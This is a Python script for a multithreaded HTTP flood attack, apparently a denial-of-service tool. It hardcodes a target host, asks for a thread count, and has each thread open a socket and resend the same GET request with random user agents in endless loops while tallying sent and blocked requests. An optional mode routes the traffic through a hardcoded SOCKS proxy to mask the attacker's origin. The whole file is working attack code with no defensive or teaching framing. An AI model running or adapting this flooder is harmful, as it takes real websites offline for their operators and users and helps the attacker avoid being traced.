import random
import socket
import threading
import socks
from colorama import Fore, init

port = 80
rs = 0
closed = 0
red = 255, 0, 0
closed = 0
proxy = 0


def LaunchSOC(th):
    global proxy
    req = "GET " + '/' + " HTTP/1.1\r\nHost: " + host + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    print(req)
    if proxy == 0:
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=AttackSOC, args=(req,))
                thd.start()
                print("" + Fore.LIGHTBLACK_EX + thd.name)
            except:
                pass
    elif proxy == 1:
        for _ in range(int(th)):
            try:
                thdp = threading.Thread(target=AttackProx, args=(req,))
                thdp.start()
                print("" + Fore.LIGHTBLACK_EX + thdp.name)
            except:
                pass


def AttackSOC(req):
    global rs, closed
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(host), int(80)))
    print(s.proxy)
    while True:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    rs = rs + 1
                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed}" + Fore.RESET + "", end='\r')
            except:
                closed = closed + 1
                s.close()
                break
        except:
            pass


# socks.set_default_proxy()
def AttackProx(req):
    global rs, closed
    socks.set_default_proxy(proxy_type=2, addr='72.195.34.59', port=4145)
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(host), int(80)))
    s.settimeout(5)
    # print(s.proxy, s.timeout)
    while True:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    rs = rs + 1
                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed}" + Fore.RESET + "", end='\r')
            except:
                closed = closed + 1
                s.close()
        except:
            pass


# def AttackProx(req):
#       try:
#          proxy = random.choice(list(proxies)).split(":")
#         if target['scheme'] == 'https':
#            s = socks.socket()
#           s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
#          s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
#         s.connect((str(target['host']), int(target['port'])))
#        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
#   try:
#      for _ in range(100):
#         s.send(str.encode(req))


if __name__ == '__main__':
    # host = input("HTTP Host: ")
    host = 'www.ddosfilter.net'
    th = int(input("Threads: "))
    proxy = int(input("Proxy: "))
    ua = open('./ua.txt', 'r').read().split('\n')
    LaunchSOC(th)
